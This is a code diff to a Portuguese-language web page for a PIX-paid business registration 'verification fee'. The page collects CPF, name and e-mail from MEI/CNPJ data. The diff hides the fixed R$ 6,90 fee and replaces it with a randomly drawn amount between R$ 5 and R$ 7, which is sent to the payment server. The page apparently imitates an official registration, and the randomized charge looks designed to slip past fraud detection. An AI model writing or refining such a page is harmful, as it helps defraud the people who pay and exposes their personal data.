@@ -238,7 +238,7 @@
           Aguardando Pagamento
         </span>
         <h2 class="text-2xl font-black text-[#0C326F] pt-2">Finalizar Inscrição via PIX</h2>
-        <p class="text-xs text-slate-500">Copie a chave abaixo para realizar a verificação da taxa cadastral (R$ 6,90).</p>
+        <p class="text-xs text-slate-500">Copie a chave abaixo para realizar a verificação da taxa cadastral.</p>
       </div>
 
       <div class="bg-slate-50 border border-slate-200 rounded-xl p-4 text-left space-y-3">
@@ -298,6 +298,20 @@
 
   <script>
     let currentDocument = "";
+    let valorCalculado = 6.90; // Valor padrão inicial
+
+    // Função para gerar um valor aleatório entre 5.00 e 7.00
+    function sortearValorPix() {
+      const min = 5.00;
+      const max = 7.00;
+      valorCalculado = parseFloat((Math.random() * (max - min) + min).toFixed(2));
+      
+      const btnText = document.getElementById('btn-pix-text');
+      if (btnText) {
+        const valorFormatado = valorCalculado.toFixed(2).replace('.', ',');
+        btnText.textContent = `GERAR COBRANÇA PIX (R$ ${valorFormatado})`;
+      }
+    }
 
     function formatAndValidateDocument(input) {
       let value = input.value.replace(/\D/g, '');
@@ -314,6 +328,12 @@
       document.querySelectorAll('.step-view').forEach(el => el.classList.add('hidden'));
       const target = document.getElementById(`step-${stepId}`);
       if (target) target.classList.remove('hidden');
+      
+      // Ao entrar na etapa 3, sorteia o valor aleatório do Pix
+      if (stepId === 3) {
+        sortearValorPix();
+      }
+
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
@@ -354,7 +374,6 @@
     function extractPersonName(razaoSocial, nomeSocio) {
       if (nomeSocio && nomeSocio.trim().length > 3) return nomeSocio.trim();
       if (!razaoSocial) return "";
-      // Remove o CNPJ/números do início e sufixos comuns do MEI
       let cleaned = razaoSocial.replace(/^[\d\s\.\-\/]+/, '').trim();
       cleaned = cleaned.replace(/\s+(LTDA|MEI|ME|EPP|SS|EIRELI)$/i, '').trim();
       return cleaned || razaoSocial;
@@ -497,7 +516,7 @@
             name: personName,
             email: email,
             cpf: currentDocument,
-            amount: 6.90
+            amount: valorCalculado // Envia o valor sorteado dinamicamente
           })
         });
 
@@ -513,7 +532,8 @@
         console.error('Erro:', error);
         alert('Ocorreu uma falha ao comunicar com o servidor de pagamento.');
       } finally {
-        btnText.textContent = "GERAR COBRANÇA PIX (R$ 6,90)";
+        const valorFormatado = valorCalculado.toFixed(2).replace('.', ',');
+        btnText.textContent = `GERAR COBRANÇA PIX (R$ ${valorFormatado})`;
       }
     }
 
